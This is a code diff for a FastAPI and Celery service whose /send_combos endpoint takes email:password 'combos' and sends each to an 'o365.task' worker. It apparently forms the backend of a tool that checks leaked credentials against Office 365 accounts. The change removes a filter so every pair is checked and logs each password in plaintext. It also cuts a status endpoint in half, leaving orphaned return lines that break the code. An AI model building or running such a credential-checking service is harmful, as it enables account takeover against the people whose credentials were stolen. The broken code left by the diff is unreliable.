@@ -30,22 +30,11 @@ def home():
 
 @app.post("/send_combos")
 async def send_combos(combo: Combo):
-    if combo.HasExchange == "true":
-        logger.info(f"HasExchange: {combo.email}:{combo.password}")
-        task_name = "o365.task"
-        task = celery_app.send_task(task_name, args=[combo.email, combo.password])
-        return JSONResponse({"task_id": task.id})
-    else:
-        logger.info(f"DoNotHasExchange: {combo.email}:{combo.password}")
-    return JSONResponse({"task_id": "DoNotHasExchange"})
+    logger.info(f"Checking: {combo.email}:{combo.password}")
+    task_name = "o365.task"
+    task = celery_app.send_task(task_name, args=[combo.email, combo.password])
+    return JSONResponse({"task_id": task.id})
 
-
-@app.get("/status/{task_id}")
-async def task_status(task_id: str):
-    task = AsyncResult(task_id)
-    if task.state == "SUCCESS":
-        return {"status": "done", "result": task.result}
-    elif task.state == "PENDING":
         return {"status": "pending"}
     else:
         return {"status": "failed"}
